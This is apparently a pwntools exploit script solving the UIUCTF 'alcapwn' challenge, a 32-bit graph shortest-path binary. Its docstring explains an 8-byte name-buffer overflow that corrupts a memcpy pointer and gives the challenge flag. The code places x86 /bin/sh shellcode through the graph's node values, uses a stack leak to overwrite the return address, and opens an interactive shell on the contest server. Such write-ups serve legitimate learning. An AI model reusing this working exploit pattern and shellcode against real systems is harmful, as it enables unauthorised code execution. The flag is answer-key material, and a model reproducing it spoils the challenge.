"""
Challenge provides an interface that allows you to construct a weighted, directional graph and 
finds the shortest path between two given nodes. 

We get a leak in the form of the address of the buffer where the shortest path will be written.
Binary is 32 bits, and has an executable stack.

The bug is a buffer overflow when the binary asks for a name for the graph. The intended process is
for the input to first be stored in a a 16 byte input_buf, before being memcpy'd to the graph
structure's name field. However, the binary actually reads 24 bytes, and the 8 byte overflow
overlaps with the pointer we're about to memcpy to. We can leverage this into an arbitray write,
which we use to overwrite the return address with the location of some /bin/sh shellcode

The shellcode is placed in memory by getting the shortest path algorithm to output what we want. I
belatedly (after solving) realized that graph itself is on the stack and we therefore don't need
to go through this song and dance. We know its address, and we can just jump to the node_values
array directly. Coercing the shortest path algorithm to do our bidding is swaggier though, so we'll 
be going with that.

One snag is that certain whitespace characters can cause issues with the command parser. The one I
ran into specifically is the "\x0b" (a vertical tab). To avoid this I just offset the start of the 
node indexes by 0x30, so we're solidly in the printable character range. The shellcode bytes don't
seem to matter.

uiuctf{t@x_eVa5iOn_!s_b@d_Th@ts_h0w_cApwn_g0T_c@uGHt}
"""

from pwn import *

binary_path = "./challenge"
lib_path = "/lib/i386-linux-gnu/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""
continue
"""

def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc alcapwn.chal.uiuc.tf 1337
        return remote("alcapwn.chal.uiuc.tf", 1337)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


# Utility methods to help construct commands
def set_node_value(io, node, value):
    io.sendline(b"V" + p8(node) + p8(value))
    io.recvuntil(": ")

def set_edge(io, src, dst, weight):
    io.sendline(b"E" + p8(src) + p8(dst) + p8(weight))
    io.recvuntil(": ")


# x86 /bin/sh shellcode
shellcode = b"\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Set up the graph structure to contain a single chain of nodes, such that follwing from the start
# to the end is akin to walking the list in order. The "shortest path" from the start to the end
# will therefor end up being every single one of the node's values, in the correct order to
# replicate our data
def write_data(io, data):
    for i, b in enumerate(data):
        set_node_value(io, i + 0x30, b)
    idx = 0
    while idx < len(data):
        set_edge(io, idx + 0x30, idx + 1 + 0x30, 1)
        idx += 1

io = start()
io.recvuntil(": ")

write_data(io, shellcode)
io.sendline("N")

# Make sure to keep the start and end index in sync with the 0x30 offset
start = 0x30
end = (len(shellcode) - 1) + 0x30

io.recvuntil("[S][E]:")
io.sendline(p8(start) + p8(end))

# Binary leaks location of the shortest_path buffer, which is on the stack
leak = io.recvuntil("name: ")
stack_leak = int(leak.split(b"<")[1].split(b">")[0], 16)

return_addr_addr = stack_leak + 0x136

print(f"STACK_LEAK: {hex(stack_leak)}")
print(f"RETURN: {hex(return_addr_addr)}")

# Trigger overflow and overwrite the return address with the shellcode address
io.sendline(flat({
    0x00: p32(stack_leak), # addr of shellcode in shortest path buffer,

    # make sure we don't change the end or start indices
    0x10: p8(end),
    0x11: p8(start),
    
    0x12: p32(return_addr_addr) # pointer to return address to overwrite
}))

io.interactive()
